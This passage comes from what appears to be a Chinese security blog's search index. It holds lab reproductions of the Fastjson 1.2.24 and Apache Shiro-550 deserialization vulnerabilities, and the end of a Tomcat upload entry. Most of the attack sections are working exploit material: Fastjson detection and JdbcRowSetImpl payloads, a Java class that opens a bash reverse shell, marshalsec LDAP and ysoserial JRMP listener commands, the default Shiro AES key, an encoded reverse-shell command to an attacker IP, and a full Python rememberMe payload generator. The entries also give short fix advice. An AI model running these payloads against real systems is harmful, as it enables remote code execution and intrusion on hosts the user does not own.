class="line">shell</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>直接访问上传的木马文件，拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081103.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
    <url>/posts/e672ba7.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。</p>
<p>在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>fastjson &lt;= 1.2.47</p>
<a id="more"></a>
<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><ol>
<li>搭建vulfocus漏洞环境</li>
<li>启动“vulfocus/fastjson-cnvd_2017_02833”</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020080801.png" alt="image"><br>3. 访问页面显示如下说明环境正常<br><img src="https://qiniu.hzktester.top/tp2020080802.png" alt="image"></p>
<h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
<p>构造请求如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.130:59541</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>其他回显方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020080803.png" alt="image"></p>
<h3 id="fastjson1-2-47以下版本通杀poc："><a href="#fastjson1-2-47以下版本通杀poc：" class="headerlink" title="fastjson1.2.47以下版本通杀poc："></a>fastjson1.2.47以下版本通杀poc：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;f&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;asdfasfd&#x2F;&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">age:11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中{“@type”:”com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”:”ldap://asdfasfd/“, “autoCommit”:true}也可以替换成其他利用链</p>
</blockquote>
<h3 id="攻击机环境配置"><a href="#攻击机环境配置" class="headerlink" title="攻击机环境配置"></a>攻击机环境配置</h3><h4 id="centos7服务器，可通外网"><a href="#centos7服务器，可通外网" class="headerlink" title="centos7服务器，可通外网"></a>centos7服务器，可通外网</h4><ol>
<li><p>修改 java 恶意类代码保存为 TouchFile.java</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">   static &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">          Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">          Process p &#x3D; r.exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;1888 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">          p.waitFor();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           &#x2F;&#x2F; do nothing</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 将恶意java代码上传到攻击机，并使用javac编译（需安装jdk1.8并配置环境变量）<br> <img src="https://qiniu.hzktester.top/tp2020080804.png" alt="image"></p>
</li>
<li><p>使用 python -m SimpleHTTPServer 快速搭建http服务<br> <img src="https://qiniu.hzktester.top/tp2020080805.png" alt="image"><br> 访问ip+1111端口号，证明http服务搭建正确<br> <img src="https://qiniu.hzktester.top/tp2020080806.png" alt="image"><br> 服务器收到响应<br> <img src="https://qiniu.hzktester.top/tp2020080807.png" alt="image"></p>
</li>
<li><p>开启ldap服务</p>
<ul>
<li><p>使用git下载<strong>marshalsec</strong>，mvn编译<strong>marshalsec</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line">cd marshalsec&#x2F;</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure></li>
<li><p>使用<strong>marshalsec</strong>开启ldap服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:1111&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020080808.png" alt="image"></p>
</li>
<li><p>nc监听1888端口</p>
<p><img src="https://qiniu.hzktester.top/tp2020080809.png" alt="image"></p>
</li>
</ul>
</li>
<li><p>构造payload发送请求</p>
</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020080810.png" alt="image"><br>5. ldap服务收到请求<br><img src="https://qiniu.hzktester.top/tp2020080811.png" alt="image"><br>6. 监听的1888端口成功反弹shell，拿到flag<br><img src="https://qiniu.hzktester.top/tp2020080812.png" alt="image"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
<li>升级Fastjson到最新版</li>
<li>WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \u0040type, \x04type等多种编码的autotype变形</li>
<li>最少升级到1.2.48以上版本且关闭autotype选项</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
    <url>/posts/48e0a35f.html</url>
    <content><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
<p>那么，Payload产生的过程：</p>
<a id="more"></a>
<p>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p>
<p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单</p>
<h2 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h2><h2 id="1-3-特征判断：返回包中包含rememberMe-deleteMe字段"><a href="#1-3-特征判断：返回包中包含rememberMe-deleteMe字段" class="headerlink" title="1.3 特征判断：返回包中包含rememberMe=deleteMe字段"></a>1.3 特征判断：返回包中包含rememberMe=deleteMe字段</h2><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><table>
<thead>
<tr>
<th>角色</th>
<th>系统版本</th>
<th>IP</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>靶机</td>
<td>Centos7</td>
<td>192.168.3.130</td>
<td>Shiro rememberMe反序列化漏洞环境</td>
</tr>
<tr>
<td>攻击机</td>
<td>kali-linux-2020.3</td>
<td>192.168.3.131</td>
<td>工具：maven、ysoserial、Shiro_exploit</td>
</tr>
</tbody></table>
<h3 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a>工具准备：</h3><h4 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h4><p>kali安装<strong>maven</strong>，执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget  https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;apache&#x2F;maven&#x2F;maven-3&#x2F;3.6.3&#x2F;binaries&#x2F;apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo mv apache-maven-3.6.3 &#x2F;usr&#x2F;local&#x2F;maven3</span><br></pre></td></tr></table></figure>

<p>添加maven环境变量（在/etc/profile末尾添加maven环境变量:）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br><span class="line">export M2_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;maven3</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$M2_HOME&#x2F;bin</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>

<h4 id="下载ysoserial并打包"><a href="#下载ysoserial并打包" class="headerlink" title="下载ysoserial并打包"></a>下载ysoserial并打包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>

<h4 id="下载Shiro-exploit"><a href="#下载Shiro-exploit" class="headerlink" title="下载Shiro_exploit"></a>下载Shiro_exploit</h4><p>检查是否存在默认的key。安装Shiro_exploit</p>
<p>Github项目地址：<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ol>
<li>攻击机使用Shiro_exploit爆破默认key（也就是AES加密的密钥）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;192.168.3.130:8080</span><br></pre></td></tr></table></figure>
爆破出默认key如下：</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020080601.png" alt="image"></p>
<ol start="2">
<li><p>攻击机制作反弹shell代码<br>监听本地端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure></li>
<li><p>Java Runtime 配合 bash 编码。<br>在线编码地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.131&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020080602.png" alt="image"></p>
</li>
<li><p>通过ysoserial中JRMP监听模块，监听8888端口并执行反弹shell命令。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020080603.png" alt="image"></p>
<ol start="5">
<li>使用shiro.py 生成Payload</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.3.131:8888</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020080604.png" alt="image"></p>
<p>shiro.py代码如下（注意key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)换为第一步爆破出的key）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])   </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>

<h2 id="1-7-构造数据包，伪造cookie，反弹shell"><a href="#1-7-构造数据包，伪造cookie，反弹shell" class="headerlink" title="1.7 构造数据包，伪造cookie，反弹shell"></a>1.7 构造数据包，伪造cookie，反弹shell</h2><ol>
<li>访问靶机环境（<a href="http://192.168.3.130:8080/%EF%BC%89%E5%B9%B6%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%8B%BE%E9%80%89remember">http://192.168.3.130:8080/）并登录，登录勾选remember</a> me<br><img src="https://qiniu.hzktester.top/tp2020080605.png" alt="image"></li>
<li>成功登录后访问任意url并抓包，查看到cookie中的remember me参数<br><img src="https://qiniu.hzktester.top/tp2020080606.png" alt="image"></li>
<li>获得的rememberMe置入cookies中<br><img src="https://qiniu.hzktester.top/tp2020080607.png" alt="image"></li>
<li>8888端口监听到流量信息</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020080608.png" alt="image"><br>5. 2222端口成功反弹shell</p>
<p><img src="https://qiniu.hzktester.top/tp2020080609.png" alt="image"></p>
<h2 id="1-8-修复建议"><a href="#1-8-修复建议" class="headerlink" title="1.8 修复建议"></a>1.8 修复建议</h2><ol>
<li>升级shiro到1.2.5及以上</li>
<li>如果在配置里配置了密钥，一定不要使用网上的密钥！！</li>
</ol>
<h2 id="1-9-遇到的问题"><a href="#1-9-遇到的问题" class="headerlink" title="1.9 遇到的问题"></a>1.9 遇到的问题</h2><ol>
<li>maven打包ysoserial时编译报错，需要在kali中安装jdk1.8的环境，配置环境变量（一定不要安装最新版的jdk，还会报错，不清楚原因）</li>
<li>使用Shiro_exploit时报错<strong>No module named Crypto.Cipher</strong>，执行以下命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip uninstall crypto</span><br><span class="line">sudo pip uninstall pycrypto</span><br><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure></li>
<li>kali2020.2版本默认没有pip，需要安装</li>
</ol>
<p>python3安装pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py | python3</span><br><span class="line">pip -V</span><br></pre></td></tr></table></figure>
<p>python2安装pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.py</span><br><span class="line">python2 get-pip.py</span><br></pre></td></tr></table></figure>
<p>检查安装情况<br><img src="https://qiniu.hzktester.top/tp2020080610.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache Shiro</tag>
      </tags>
  </entry>
</search>
